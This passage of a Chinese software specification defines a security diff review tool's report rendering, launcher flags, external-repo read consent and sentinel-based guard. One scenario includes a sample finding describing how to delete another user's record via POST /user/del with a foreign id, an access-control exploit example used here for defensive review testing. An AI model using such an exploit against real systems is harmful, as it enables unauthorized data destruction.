  入链接;mapper XML 终端(`change=external`)与普通节点同等对待(有 `file` 即链)。
- 显示文本与属性值含 HTML 敏感字符(`<`/`>`/`&`/`"` 等)时 SHALL 做实体转义,NEVER 产出
  语法破损的标记;数据面(数据文件/manifest)SHALL NOT 因此引入任何 HTML 标记。
- `sdr_manifest.json` `rows[]` 与数据文件 `rows[]` 的 `entry`/`chain` 字段 SHALL 保持
  **纯文本短形**(不含任何链接语法/HTML 标记)——两者是机器消费面;表格链接是同一数据
  的渲染投影。

**数据文件**:渲染 SHALL 同步写出 `<run-dir>/sdr_report_data.json`,承载报告全量结构化
数据(单元行 `rows[]`、合并去重后的 `findings[]`(含 P-NN/维度/severity/位置/风险/建议/
control_ref,以及可选的复现方式 `repro`、修复对比 `fix_diff`)、分支调用链图数据、诚实边界
条目、头部元信息,以及可选的 `readability[]` 建议清单——「可读性自检」小节的数据源),
HTML 内嵌**同一份数据**(JSON 等价一致)——人读 HTML 与机器读 JSON 同源;下游确定性消费
(如未来 /mgh-blst、报告后处理工具)SHALL 以数据文件为接口,新字段按「字段缺席 = 不适用」
消费。`--check` SHALL 校验:数据文件存在且可解析、与 HTML 内嵌数据一致、manifest 计数与
draft 实际一致;另 SHALL 对模型文本字段(`risk`/`suggestion`/`repro`/`fix_diff` 的说明文本)
做闭集扫描(闭集取值 import 能力 `human-facing-output-discipline` 的单源模块)——命中只在
stderr 打计数告警(字段名 + 词),SHALL NOT 改变退出码:模型措辞是软质量,不能因为它卡死
跑完的长流程;确定性文案的闭集合规由回归测试保障,不入 `--check` 面。

同名报告文件已存在 SHALL 原子覆盖(时间戳到秒内重跑)。`sdr_manifest.json` `rows[]`
(`{unit_id, entry, chain, frontend_is, frontend_count, issue_refs[]}`;issue_refs = 该单元
各维度问题编号的展平列表)语义不变;`counts` 语义不变;其余字段保留现行(`excluded_files`
透传等)。draft 问题记录 schema 增可选 `repro`/`fix_diff` 字段(`line` int 可选保留;
本 change 之前的旧 draft 没有这些字段 = 章节二省略对应展示,渲染不失败;任务模板与
agent 定义双端同步披露)。

诚实边界 SHALL 至少含 7 条(现行 7 条语义保留):① 发现是 LLM 候选需人工复核,非确认漏洞;
② 接口分组是启发式,漏分组接口退入独立单元(分析粒度粗但覆盖不丢);③ 引用存量控制断言存在、
不断言有效;④ 外部仓结论是检索时点快照(不保证前端分支已同步);⑤ 基线经字节预算投影,低优先
级细节可能未全量投影;⑥ 敏感目录来源与覆盖范围(目录外字段仅按回退规则识别);⑦ 排除集披露。
各条措辞 SHALL 满足「报告确定性文案措辞」段。
渲染器 NEVER 写 `openspec/`、NEVER 写 run 目录、数据文件与报告文件之外的目标仓文件;历史
`.md` 报告 SHALL NOT 被回写或迁移。

#### Scenario: 分组概览与诚实边界的平实措辞

- **WHEN** 渲染一个 codegraph=on 的 run(分组统计含 `anchors_changed=4`、`anchors_upstream=2`)
- **THEN** 头部分组概览输出平实中文(如「按变更接口归组 4 条调用链、2 处改动挂接到未变更
  接口」形态),全文确定性文案不含禁用闭集词(「路由锚」「向上锚定」等);诊断数字可在
  默认折叠的明细中保留,数据文件字段不变

#### Scenario: 复现方式与修复对比的渲染

- **WHEN** 某 `.done` draft 的 finding 带 `repro:"以任一有效会话 POST /user/del 传他人 id
  → 他人记录被删除"` 和 `fix_diff:[{before:"deleteById(id)",after:"deleteByIdAndOwner(id,
  currentUserId)"}]`
- **THEN** 章节二该 P-NN 条目渲染「复现方式」文本行和一组「修改前/修改后」代码块(等宽、
  逐字注入、无 HTML 语法破损),数据文件 `findings[]` 对应项带这两字段

#### Scenario: 旧 draft 无新字段省略

- **WHEN** 某 `.done` draft 的 finding 没有 `repro`/`fix_diff` 字段(本 change 之前产出的
  旧 draft)
- **THEN** 章节二该条目不出现「复现方式」行和修复对比块,渲染不失败,`--check` 不视为
  不一致

#### Scenario: --check 禁词扫描只告警

- **WHEN** 某 draft 的 `risk` 文本包含「基线投影」(闭集词)
- **THEN** `render_sdr_report.py --check` 对该 run 的退出码与没有该词时相同,stderr 带至少
  一条计数告警(字段名 + 词)

#### Scenario: 文本束与可读性自检小节

- **WHEN** 某 run 9 份 draft 合并渲染,编排器随后派发读者模拟评审、建议文件落盘,再重渲染
- **THEN** 首次渲染就产出 `readability_text_bundle.json`(每条 P-NN 的人类面文本);重渲染
  后数据文件带 `readability[]` 字段、报告含默认折叠的「可读性自检」小节,正文其余内容与
  退出码不变,`--check` 的数据等价校验通过

#### Scenario: 评审缺席报告仍完整

- **WHEN** 读者模拟评审未派发或建议文件不可解析
- **THEN** 数据文件与报告都没有 `readability` 字段/小节,渲染退出码不变;resume 把该 run
  收尾为完成(评审缺席不是失败)

#### Scenario: 简报表行覆盖全单元形态

- **WHEN** 某 run 产 4 个 interface 单元(其一为多路由合并单元)、3 个 standalone 单元、其中
  2 个 interface 单元的 `chain[]` 带**非 external** 节点的 `branch_of`(真实分支)
- **THEN** 章节一表格 7 数据行(排序:interface 按 route 升序、standalone 殿后);interface 行
  调用链列为缩写链(含 `⤷`/`⇢`/`†`),standalone 行为方法定义短形;带分支的 2 单元在章节三
  各有一张内嵌 SVG,线性单元不出现;全部维度列为 `否` 或可点击的 `是 [P-NN]` 页内锚点链接

#### Scenario: 前端两列三态

- **WHEN** context.json 声明外部仓且 `/order/submit` 命中 2 处、`/cache/user/direct` 0 处,
  另一路由所在 run 未声明外部仓
- **THEN** `/order/submit` 行前端两列 = `是`+`2 处`;`/cache/user/direct` 行 = `否`+`—`;
  未声明仓的 run 其全部行 = `未知`+`—`

#### Scenario: 无锚点纯文本编号引用

- **WHEN** 渲染任意带 findings 的报告
- **THEN** `P-NN` 编号全局唯一且章节二可按编号定位;简报表格维度列的 `P-NN` 为**页内锚点
  链接**,点击在浏览器内跳转到章节二对应条目(页内跳转零外部依赖;原 MD 形态的内部锚点
  禁令随报告形态切换废止);数据文件与 manifest 的 `issue_refs[]` 仍为纯文本编号(不含
  链接语法)

#### Scenario: 链节点渲染为源文件链接

- **WHEN** 某单元 `chain[]` 含节点 `{fqn_short: "OrderController.submit", file:
  "src/main/java/com/x/controller/OrderController.java", line: 42}` 与节点 `{fqn_short:
  "OrderMapper.insertOrder", file: "src/main/java/com/x/mapper/OrderMapper.java", line: null}`
- **THEN** 调用链列依次渲染 `href="src/main/java/com/x/controller/OrderController.java#L42"`
  与 `href="src/main/java/com/x/mapper/OrderMapper.java"`(无锚点退化)的链接,显示文本为
  短形;分隔符不入链接,链的阅读顺序与短形文本不变

#### Scenario: 仓外与异常路径降级纯文本

- **WHEN** 某 finding 的 `file` 为仓外绝对路径,另一 chain 节点 `file` 为空串
- **THEN** 前者位置、后者链节点均保持纯文本形态(无 `<a>`),报告不含仓外路径链接;渲染退出码
  0,`--check` 不报不一致

#### Scenario: manifest rows 保持纯文本

- **WHEN** 渲染完成产数据文件与 manifest,HTML 表格调用链列含源文件链接
- **THEN** `sdr_manifest.json` 与 `sdr_report_data.json` 对应行 `chain`/`entry` 字段均为
  纯文本短形(不含 `<a>`/`href` 等任何链接语法/HTML 标记),与「去链接化后的表格单元格
  文本」一致

#### Scenario: 报告文件名与内容可追溯

- **WHEN** 对分支 `feature-pay` 于 2026-09-03 14:30:22 完成评审
- **THEN** 项目根出现 `mgh-sdr-feature_pay-20260903_143022.html`,头部含 branch/base/时间戳,
  章节一每行可溯源到 unit_id,章节二每条可溯源到 file:line(或 file)

#### Scenario: draft 缺 line 字段降级

- **WHEN** 某 `.done` draft 的 finding 无 `line` 字段(旧格式 draft)
- **THEN** 章节二该条位置写 `file`(无行号),有链接时渲染为不带 `#L` 锚点的文件链接,
  渲染不失败,`--check` 不视为不一致

#### Scenario: 部分单元 failed 不阻断渲染

- **WHEN** 10 个单元 9 个 `.done`、1 个 `.failed`
- **THEN** 渲染器汇总 9 份 draft 出报告,manifest `counts.failed_units = 1` + `failed_units[]`
  列出该单元 id 与 reason,报告诚实边界披露「1 个评审单元失败,该单元覆盖范围未复核」;失败
  单元不出现在章节一表格行(其覆盖未复核),仅在诚实边界披露

#### Scenario: 重复 finding 跨单元去重

- **WHEN** 同一接口路由的两个 hunk 被拆入同组或相邻单元,各产一条 `{dimension,route,file}` 相同
  的 finding
- **THEN** 渲染器按三元组去重合并为一条(line_hint 取并集),章节二仅一条 P-NN,引用它的
  单元行维度列共享该编号

#### Scenario: manifest rows 投影与表格一致

- **WHEN** 渲染完成产数据文件与 manifest
- **THEN** `sdr_report_data.json` `rows[]` 与 `sdr_manifest.json` `rows[]` 逐行一致,长度 =
  章节一表格数据行数,`unit_id`/`entry`/`chain`/`frontend_is`/`frontend_count` 与表格单元格
  一致(链接按「去链接化后的短形文本」比对);`issue_refs[]` 展平该行全部问题编号

#### Scenario: 报告披露排除集与分组统计

- **WHEN** 本次 run 排除了 120 个文件(测试 80/构建产物 30/静态资源 10)且 codegraph 捕获
  25 条变更集内调用边、向上锚定 8 条链
- **THEN** 报告诚实边界含排除计数与分类,manifest `counts.excluded_files == 120`;分组统计
  在报告头部「分组概览」以平实措辞可见(满足「报告确定性文案措辞」段;明细数字可收纳于
  默认折叠的「分组诊断」),供操作者判断分组质量

#### Scenario: 报告离线自包含

- **WHEN** 渲染任意报告并在文本层面检查产物
- **THEN** HTML 内不含任何 `http://`/`https://` 的脚本、样式、字体、数据引用(外链图片同为
  零),样式与脚本全部内嵌,数据存在于内嵌数据块;断网环境下 file:// 打开全部章节可读、
  章节三图形可见

#### Scenario: 数据文件与内嵌数据一致且 --check 可校验

- **WHEN** 渲染完成,随后对同一 run 目录跑 `--check`
- **THEN** `<run-dir>/sdr_report_data.json` 存在、可解析,且与 HTML 内嵌数据块 JSON 等价
  (同数据两种载体);`--check` 退出码 0;人为破坏数据文件或内嵌块之一后 `--check` 退出码 2

#### Scenario: 章节三 SVG 零外部依赖且语义保留

- **WHEN** 某 branched 单元 `chain[]` 含一个 `branch_of` 分支宿主、一个 mapper 终端节点
  (`change=external`)与一个未变更节点(`†`)
- **THEN** 该单元章节三为内嵌 `<svg>`(非 mermaid 代码块、非 canvas、不加载任何图形库),
  mapper 终端边为虚线样式,未变更节点带 `†` 前缀,分支拓扑与 `chain[]` 一致;图形可缩放平移

#### Scenario: 视图筛选不回写数据

- **WHEN** 读者在章节一按 severity 或单维度筛选表格行
- **THEN** 仅不匹配行被隐藏(纯视图态),`sdr_report_data.json` 与 `sdr_manifest.json` 的
  `rows[]` 不因此变化;重新打开报告后全部行恢复

### Requirement: 敏感目录复用与默认模板回退(与 sra/srr 的显式分歧)

`sensitive-data` 维度的检查清单 SHALL 按以下优先级解析:① `<repo>/.mgh-sra/sensitive_catalog.json`
存在 → 经 sibling import 复用 `sensitive_catalog` 模块解析 + 闭集校验(非法 → 退出码 2 早停,
任何 LLM token 之前);② 不存在 → **回退加载随 install 落地的默认模板**
(`.mgh-core` 内 `sensitive_catalog.json.example`,即 PIPL/GB-T 35273 37 项)作为生效目录。解析后
对象(`{version, source, categories[], items[], counts{}, directive}`)SHALL 由 `sdr_context.py`
**物化为 run 目录内的独立文件**(`<run-dir>/sensitive_catalog.json`),该文件的**绝对只读路径**
SHALL 经任务模板三元组搭载进每一个 subagent task 消息(与外部仓结论文件的路径透传同构;
编排器与 launcher 提示词 SHALL 指认该文件路径,SHALL NOT 内嵌目录对象本体——launcher 侧
NEVER 对该对象做静默截断)。manifest `sensitive_catalog_source` SHALL 记
`project|default-template`。该回退是 sdr 与 sra/srr(`null` → 6-facet 兜底)的**有意行为分歧**:
sdr 复核的是代码 diff,收窄到 6 facet 会让公司目录缺位时的敏感数据检查显著弱于默认模板;此分歧
SHALL 在本 spec、命令壳 `--help` 文案与报告诚实边界三处显式披露。

#### Scenario: 项目目录存在则复用

- **WHEN** `<repo>/.mgh-sra/sensitive_catalog.json` 存在且合法
- **THEN** 编排器以 `sensitive_catalog_source: "project"` 解析,对象物化为
  `<run-dir>/sensitive_catalog.json`,每个 subagent 的 task 消息携带该文件只读路径,subagent
  逐项查脱敏缺口并标 `catalog_key`

#### Scenario: 项目目录缺失回退默认模板

- **WHEN** `<repo>/.mgh-sra/sensitive_catalog.json` 不存在
- **THEN** 编排器以 `sensitive_catalog_source: "default-template"` 加载 `.example` 默认模板,
  物化与路径搭载同上,检查面为 PIPL/GB-T 35273 37 项;manifest 与报告披露该来源

#### Scenario: 项目目录非法早停

- **WHEN** `<repo>/.mgh-sra/sensitive_catalog.json` 存在但含未知 category
- **THEN** 编排器退出码 2 + 可操作 stderr(指向该文件的违规项),不 spawn 任何 subagent

#### Scenario: 敏感目录文件对每个维度子代理可达

- **WHEN** 主路径 run 中任一 subagent(含 sensitive-data 维度)收到任务消息
- **THEN** 消息三元组含敏感目录物化文件的绝对只读路径,该文件存在于 run 目录且内容为解析后
  目录对象(NEVER 出现「维度声称可读目录而消息中无任何搭载」的不可达形态);launcher 编排
  提示词对该文件只作路径指认,无内嵌、无截断

### Requirement: launcher 单命令外壳与运行域激活

新增 launcher 脚本 `core/scripts/mgh_sdr_launch.py`(**随 install 分发**;人/cron 入口,NEVER 被
宿主 subagent 调用;标准库)SHALL 支持一条命令拉起全流程:`py mgh_sdr_launch.py --repo
<abs-target> [--branch <ref>] [--base <ref>] [--host opencode|claude] [--dimensions <json>]
[--multi-branch <file>] [--read-root <abs>]... [--model <provider/model>] [--open] [--dry-run]`。
launcher
SHALL:① 校验目标仓可达 + 宿主 CLI 在 PATH(`--host` 显式 > opencode > claude;均缺退出码 2 +
recipe);② 于**自身进程内**(编排提示词发往宿主 CLI **之前**)执行编排流程中需要项目外读权限的
部分——调用 `sdr_context.py` 完成外部仓受控检索与结论落盘,使跨树读取只发生在 launcher 进程
(已获用户明示授权的 shell 会话),宿主 CLI subagent 会话零权限打断;跨树读取以项目配置
`<repo>/.mgh/read-roots.json` 为前提——未配置的外部声明仓 SHALL 被跳过(零读取),经 stderr warn
+ stdout `pending_approval[]` 披露,不阻断流程;③ 准备运行域:写 `<repo>/
.mgh-sdr/.active` 磁盘哨兵(JSON `{domain:"mgh-sdr", target, out_roots:[], read_roots:[<已配置
且本次参与检索的外部仓>], v:1}`)+ 组装编排提示词文件(逐字含 launcher 已产出的绝对路径:run 目录 /
基线 slice /外部结论文件 / `sensitive_catalog_source` 判定结果 / `pending_approval[]` 若非空),
spawn `opencode run`(任务经 stdin)或 `claude -p`(任务经 stdin)执行编排;④ 宿主 CLI 退出后移除
哨兵;⑤ **分支存在性预检**:对每个待跑分支(单分支与 `--multi-branch` 同一预检、真跑与
`--dry-run` 同一预检),在任何产物写入(run 目录 / 哨兵 / 提示词文件)与任何宿主 spawn 之前
先以 `git rev-parse --verify` 校验分支 ref 在目标仓可解析;不可解析 → 该分支**确定性早败**
(记 FAILED,原因 = branch-not-found;零宿主 spawn、零 LLM 消耗、零 run 目录与哨兵副作用),
其后的分支照常执行——`--dry-run` 因此对清单有效性有真实校验力(含无效分支的 dry-run 退出 1,
NEVER 报 ok);⑥ **报告认领以本分支 run 目录为唯一来源**:宿主 CLI 退出 0 后,launcher SHALL
读该分支 run 目录内 `sdr_manifest.json` 的 `report` 字段(绝对路径)认领报告;manifest 缺失
或其 `report` 指向的文件不存在 → 该分支记 FAILED(原因 = no-report);launcher NEVER 以
「仓根最新 / 任意 `mgh-sdr-*.html` glob」认领任何分支的报告——跨分支产物认领在结构上不可能;
⑦ **spawn 环境卫生**:spawn 宿主 CLI 时 SHALL 保证子进程的项目目录解析落在目标仓——剥离
子进程环境中的 `PWD` 变量(宿主按 `PWD ?? cwd` 解析项目归属时回落到 launcher 显式传入的
cwd = 目标仓;claude 宿主同路径处理、无害);⑧ **可诊断性与模型透传**:opencode spawn SHALL
追加 `--print-logs --log-level ERROR`(provider 形失败在 launcher stderr 可定位,NEVER 只有
一句错误信封);`--model <provider/model>` SHALL 透传给宿主 CLI 的同名 flag(opencode 与
claude 同形),未传时不附加。
`--multi-branch <file>` SHALL
对清单分支**串行**逐个执行完整流程(每分支独立 run 目录 + 独立报告;单分支失败记录后继续)。
launcher 自身退出码:0 全部分支成功 · 1 运行时失败(任一分支 FAILED:分支不存在 / sdr_context
失败 / 宿主 CLI 非零退出 / 宿主退出 0 但未产报告)· 2 误用(参数/宿主缺失/目标不可达)。

#### Scenario: launcher 一条命令拉起 opencode 全流程

- **WHEN** 用户在任意 cwd 运行 `py mgh_sdr_launch.py --repo D:/work/svc --host opencode`
- **THEN** launcher 校验宿主、完成外部仓检索与运行域准备(哨兵 + 提示词文件)、spawn
  `opencode run`(stdin 传编排提示词);流程跑完后项目根出现报告文件、哨兵被移除;全程 subagent
  零权限确认打断

#### Scenario: 外部仓读取权限只发生在外壳

- **WHEN** 存量设计声明的外部前端仓已配置于 `.mgh/read-roots.json` 并需被检索
- **THEN** 检索由 launcher 进程(用户显式运行的 `py` 命令)完成,宿主 CLI 内 subagent 仅读结论
  文件——运行域守卫对未授权根的跨树读拦截语义不变,宿主会话 NEVER 弹外部目录权限确认

#### Scenario: 未配置仓不检索、不进哨兵、待批披露

- **WHEN** 存量设计声明 `D:/xxx/front` 但配置中无该路径,launcher 同参数启动
- **THEN** launcher 对该仓零读取,哨兵 `read_roots[]` 不含该路径,stdout/stderr 披露
  `pending_approval` 与 `unapproved` 原因,编排提示词携带该清单,流程继续(纯后端 diff)

#### Scenario: 多分支串行

- **WHEN** `--multi-branch branches.txt`(每行一个分支名)含 3 个分支
- **THEN** launcher 串行跑 3 轮完整流程,产出 3 份独立报告 + 各自 run 目录;第 2 分支失败不阻断
  第 3 分支,launcher 最终退出码 1 且 stderr 列出失败分支

#### Scenario: 不存在分支确定性早败

- **WHEN** `--multi-branch` 清单含一个目标仓不存在的分支名(如失败探针),launcher 真跑
- **THEN** 该分支在创建 run 目录、写哨兵、spawn 宿主之前即被记 FAILED(原因 branch-not-found),
  零宿主 spawn、零 LLM 消耗、零 run 目录;其后的分支照常完整执行并各出报告;launcher 最终退出码 1
  且 stderr 失败汇总列出该分支及原因

#### Scenario: dry-run 对无效清单如实报败

- **WHEN** 以 `--dry-run` 跑同一含不存在分支的清单
- **THEN** 不存在分支同样被记 FAILED(与真跑同一预检),launcher 退出码 1——绿色冒烟不再对
  无效分支清单给出虚假信心;有效分支照常产 dry-run 产物(run 目录 + 提示词,零 spawn)

#### Scenario: 报告认领以本分支 run 目录为准

- **WHEN** 某分支宿主 CLI 退出 0 但该分支 run 目录内无 `sdr_manifest.json`(如宿主中途干净停),
  且仓根存在其他分支已渲染的 `mgh-sdr-*.html` 报告
- **THEN** 该分支被记 FAILED(原因 no-report),launcher NEVER 把仓根任何既有报告记为该分支
  产物;`--open` 不触发;stdout `reports[]` 不含跨分支认领的路径

#### Scenario: 非 target cwd 启动宿主归属正确

- **WHEN** 用户在开发仓(或任意非目标仓)cwd 运行 launcher 指向目标仓,宿主为 opencode
- **THEN** spawn 的子进程环境中无 `PWD`,opencode 按 launcher 传入的真实 cwd(目标仓)解析项目
  归属——会话创建在目标仓项目下,项目级配置/插件按目标仓生效(修复「从开发仓启动全灭」)

#### Scenario: 模型透传

- **WHEN** launcher 以 `--model deepseek/deepseek-flash` 启动
- **THEN** 宿主 CLI 以该模型 id 启动(opencode `run --model …` / claude `-p --model …`);
  未传 `--model` 时 launcher 不附加任何模型参数(沿用宿主自身默认)

### Requirement: launcher 内联多分支清单 --branch-list

launcher `core/scripts/mgh_sdr_launch.py` SHALL 额外接受内联多分支参数
`--branch-list "<b1,b2,...>"`——值为**逗号分隔的分支名清单**,直接写在命令行上(引号
包裹),与文件喂法 `--multi-branch <file>` 覆盖同一「多分支串行 sweep」需求。解析规则:
按 `,` 切分,逐项去除首尾空白,**任一空项**(如 `a,,b`、结尾多逗号、整体为空或全空白)
→ 退出码 2 + 可操作 stderr(报出违规项序号),NEVER 静默跳过;重复分支名保序去重
(只跑一次,与 `--multi-branch` 文件模式行为一致);内联模式无注释语法(每个逗号项都是
分支名)。`--branch-list` 与 `--multi-branch` **互斥**:两者同时给出 → 退出码 2 + 可操作
stderr(二选一),NEVER 静默按优先级取其一(歧义输入 fail-loud;逗号在 git 分支名中
合法,NEVER 以「值含逗号」推断喂法)。`--branch-list` 与单分支参数 `--branch` 同给时,
内联清单优先(`--branch` 被忽略),与 `--multi-branch` 压过 `--branch` 的既有行为同形。
内联清单 SHALL 汇入与 `--multi-branch` **完全相同**的串行逐分支流程:每分支独立 run
目录 + 独立报告;单分支失败记录后后续分支照常执行;launcher 自身退出码语义不变
(0 全部分支成功 · 1 任一分支 FAILED · 2 误用)。`--help` SHALL 载明该 flag(命令壳
不展 launcher flag 表,`--help` 是该参数的唯一契约面)。

#### Scenario: 内联清单串行同语义

- **WHEN** 用户运行 `py mgh_sdr_launch.py --repo <项目> --branch-list "feat/a, feat/b"`
  (含一个带首尾空白的项),两分支在目标仓均可解析
- **THEN** launcher 串行执行两轮完整流程,产出两份独立报告 + 各自 run 目录;项首尾
  空白被去除后按分支名正常预检;退出码 0

#### Scenario: 双参数互斥拒识

- **WHEN** 同一次调用同时给出 `--multi-branch branches.txt` 与 `--branch-list "a,b"`
- **THEN** launcher 退出码 2,stderr 报出二选一的 recipe,零分支执行、零产物写入
  (fail-loud,不猜不静默取其一)

#### Scenario: 空项拒识

- **WHEN** `--branch-list "feat/a,,feat/b"`(中间空项)或 `--branch-list "feat/a,"`
  (结尾逗号)或 `--branch-list "  "`
- **THEN** launcher 退出码 2,stderr 可操作地报出违规项(序号/原因:空分支项),零
  分支执行;后续分支 NEVER 被静默吞掉

### Requirement: 外部仓读取授权经用户确认并持久化到项目配置

`/mgh-sdr` 编排流 SHALL 在 launcher/sdr_context 报告非空 `pending_approval[]` 后、继续消费外部
结论前,于宿主会话向用户呈现待批外部仓清单(绝对路径 + 用途说明)并请求决策:**同意** → 编排器经
`py <mgh-core>/scripts/read_roots_config.py --target <repo> --add <abs>` 将仓写入项目配置
(支持一次多仓逐个 `--add`),随后**重跑 launcher 同参数**完成检索(配置即时生效,launcher 幂等可
续);**拒绝** → NEVER 写配置,按降级继续,报告边界声明「外部仓未授权,相关检查面未覆盖」。编排器
NEVER 在未获用户同意时写配置。确定性叶脚本 `read_roots_config.py`(标准库、自定位)SHALL:支持
`--target <abs>` 与 `--add <abs>`(可重复)/`--remove <abs>`/`--list`/`--check`;对
`<target>/.mgh/read-roots.json` 原子写(schema `{"v":1,"read_roots":[…]}`,未知字段保留、顺序
稳定);幂等(已存在的 `--add` 为 no-op);`--add` 校验目标存在且为目录(违者退出码 2 + 可操作
stderr);每次实际变更打印 stderr(变更前后条目);stdout 结构化 JSON(`configured[]`/`added[]`/
`removed[]`),退出码 0/1/2;`--check` 校验配置文件自洽(schema 合法 ∧ 条目均存在且为目录,违者
退出码 2)。

#### Scenario: 首次运行问询、同意后写配置并重跑放行

- **WHEN** 首次在某项目运行 `/mgh-sdr`,存量设计声明前端仓 `D:/xxx/front`(未配置),编排器向
  用户呈现待批清单,用户同意
- **THEN** 编排器执行 `py …/read_roots_config.py --target <repo> --add D:/xxx/front`(stderr
  打印变更),重跑 launcher 同参数;第二轮 launcher 检索该仓、哨兵 `read_roots[]` 含该路径,
  subagent 工具面/Bash 面对该仓的读按 `runtime-hook-enforcement` 的统一读允许集放行

#### Scenario: 拒绝后降级继续并如实披露

- **WHEN** 用户对待批仓 `D:/xxx/front` 拒绝
- **THEN** 配置不变,流程按 `external_skipped:"unapproved"` 降级继续跑完并渲染报告;报告边界
  声明「外部仓未授权,前端相关检查面未覆盖」,简报表前端两列为「未知 / —」

#### Scenario: 二次运行不再问询

- **WHEN** 上一 run 中用户已批准 `D:/xxx/front` 并写入配置,再次运行 `/mgh-sdr`
- **THEN** launcher 检索照常、`pending_approval` 为空,编排器不再问询(每仓仅首次决策)

#### Scenario: read_roots_config.py 幂等与非法输入

- **WHEN** 对同一已配置仓重复 `--add`;或 `--add D:/gone`(不存在);或 `--check` 遇到含失效条目
  的配置文件
- **THEN** 重复 `--add` 为 no-op(stdout `added:[]`,退出码 0);`--add D:/gone` 退出码 2 +
  stderr 指明目录不存在;`--check` 对失效条目退出码 2 并列出条目(fail-closed:失效条目在守卫
  侧本就零授权,`--check` 使其显式可见)

### Requirement: sdr 运行域守卫激活与幂等 resume

`/mgh-sdr` SHALL 为第 6 个运行域:env `MGH_SDR_ACTIVE=1` 或磁盘哨兵 `<repo>/.mgh-sdr/.active`
(向上 walk 发现,承既有激活契约)激活守卫;哨兵 `read_roots[]` 声明的外部只读根按 `runtime-hook-enforcement`
的 read_roots 扩展要求生效。

哨兵的写入 SHALL 为**确定性脚本副作用**且分**两级时序**:

- **step 0 预武装**:编排器在**首次调用 `sdr_context.py` 之前**执行
  `py <mgh-core>/scripts/resume_sdr_state.py --run-dir <abs-run-dir> --repo <abs> --arm-sentinel`,
  确定性写最小哨兵(`domain:"mgh-sdr"`、`target`= `--repo` 的 Windows 原生绝对路径、
  `out_roots:[]`、`read_roots:[]`)。目的:闭合「step 1 在参数解析/前置校验阶段即失败 → 哨兵未写 →
  守卫整个试错期休眠」的窗口。`--arm-sentinel` SHALL 幂等(同 target 重复执行为 no-op;不覆盖已存在
  哨兵的 `read_roots[]`)。SHALL NOT 以 `Bash printf` 手执行配方实现。
- **step 1 细化覆盖**:`sdr_context.py` 完成基线投影与外部检索后的 co-write 语义不变(把哨兵刷新为
  含实际检索根 `read_roots[]` 的完整版);launcher 路径的 spawn 前写入亦不变。

流程 SHALL 幂等可恢复,分**产物层**与**入口层**两件事:

- **产物层**(既有语义不变):`diff_group.py --materialize` 对已存在 `.done` marker 的单元跳过物化重复工作;
  `fanout_runner.py --resume` 按磁盘 marker 重派 pending;`render_sdr_report.py` 对 draft 齐备的 run 目录
  可重复执行(重跑覆盖同名报告)。
- **入口层**(既有语义):`resume_sdr_state.py`(见 `resume-step-discipline`)SHALL 从 `<run-dir>/`
  磁盘产物重派生 `step` / `next_action` / `discipline_reminders[]`,使压缩 / 崩溃 / 新会话三态坍缩为同一条
  恢复路径(**读磁盘 → 继续**)。恢复 SHALL 复用**既有 run 目录**(同一 `<run-dir>`),SHALL NOT 另起一个新的
  时间戳 run 目录——新建目录 = 已完成单元的 marker 不在新目录里 = 全部重做(零复用即全损)。

编排器每步完成后 SHALL 跑对应产出者 `--check`,失败(退出码 2)回退重跑,不带着破损产物继续。
step 1 **之前**的失败(含 argparse 退出码 2)SHALL 由编排器按命令壳收尾段的「干净停止」路径移除预武装
哨兵(`rm <repo>/.mgh-sdr/.active`),NEVER 留残哨进入日常开发;残留(宿主硬杀)由下次 launcher 启动时
检测并复用/清理的既有路径兜底。

**恢复指引 MUST 域内可执行**:命令壳给出的恢复、排障与"磁盘状态是否正常"判定指引,SHALL 只引用
在 sdr 运行目录下可实际执行的脚本——即接受 `--run-dir <sdr run dir>`(或等价的 `<run-dir>` 位置参数)
且不依赖其它运行域目录布局的产出者(如 `diff_group.py --check <run-dir>`)。命令壳 SHALL NOT 让
编排器调用以 `<target>/.mgh-init` 为默认状态根、在 sdr 运行目录下必然以"目录不存在"失败的脚本
(如 `resume_state.py`,其运行目录解析为 `--init-dir > <target>/<run-root=默认 .mgh-init>`);此类
跨域引用 SHALL 在 sdr 场景视为坏指引,因为它百分之百失败并使编排器在真实拥塞形态下失去判据。
该约束 SHALL NOT 被读成"指引只能有一个":`resume_sdr_state.py`(入口层状态重派生,域内可执行)与
`diff_group.py --check <run-dir>`(产物层完整性)是**两件不同的事**,SHALL 并存——前者回答"我做到哪一步、
下一步跑什么",后者回答"分组产物有没有坏"。二者语义不同,SHALL NOT 互相替代:产物完好而以产物检查
代替状态查询会丢失"下一步";状态可派生而产物已坏时,状态查询本身不校验产物。

**已披露的入口层缺口(既有披露,本 change 不修)**:`mgh_sdr_launch.py` 每次调用按当前时刻**新建**
`<repo>/.mgh-sdr/runs/<ts>-<branch>/`,且无 `--resume` / `--run-dir` 参数;故「经 launcher 同样参数重跑即续跑」
**目前不成立**(会落到新目录、从头再跑)。续跑入口为:由调用方已知 run 目录时,经命令壳的显式
`--run-dir` + `resume_sdr_state.py --run-dir <abs>` 继续。launcher 侧的 run 目录复用 SHALL 由后续 change 补齐。

#### Scenario: step 1 失败窗口守卫仍武装

- **WHEN** 编排器 step 0 已跑 `--arm-sentinel`,随后对 `sdr_context.py` 传入不存在的 flag argparse
  退出码 2,再接续尝试 `py -c` 内联或 heredoc 形态解析产物
- **THEN** 因 `<repo>/.mgh-sdr/.active` 已在,守卫对后续违规动作照常 fail-loud(退出码 2 + recipe),
  不再存在「试错期整段放行」的窗口

#### Scenario: 预武装哨兵幂等且不被 step 0 重复破坏

- **WHEN** 预武装之后,编排器因压缩/重入再次执行同一 `--arm-sentinel` 命令
- **THEN** 已存在且 `target` 相同的哨兵逐字不变(no-op,`read_roots[]` 即使已被 step 1 细化也 NEVER
  被清空);`target` 不同则退出码 2 + 报错(拒绝把守卫锚到第二个树)

#### Scenario: step 1 成功后的完整哨兵覆盖预武装

- **WHEN** `--arm-sentinel` 预武装(read_roots 空)后 `sdr_context.py` 完整跑成并检索了两个外部根
- **THEN** co-write 把同一哨兵刷新为 `read_roots[]` = 实际检索根;守卫的读允许集随之扩展

#### Scenario: step 1 前干净停止移除预武装哨兵

- **WHEN** step 1 因参数错误终止、用户选择干净停止,编排器走壳的移除步
- **THEN** `<repo>/.mgh-sdr/.active` 被移除,守卫恢复休眠,日常开发零误伤

#### Scenario: 崩溃后 resume 零全损推进

- **WHEN** fan-out 中途宿主中断(部分单元 `.done`、部分 pending),调用方带着**同一个** run 目录路径回来
- **THEN** `resume_sdr_state.py --run-dir <abs>` 报 `step="fanout"` 与确切重派命令;`diff_group.py --materialize`
  复用既有 run 目录(按 resume 语义),dispatcher 仅重派未 `.done` 单元,已完成单元零重复消耗;最终报告覆盖全部单元

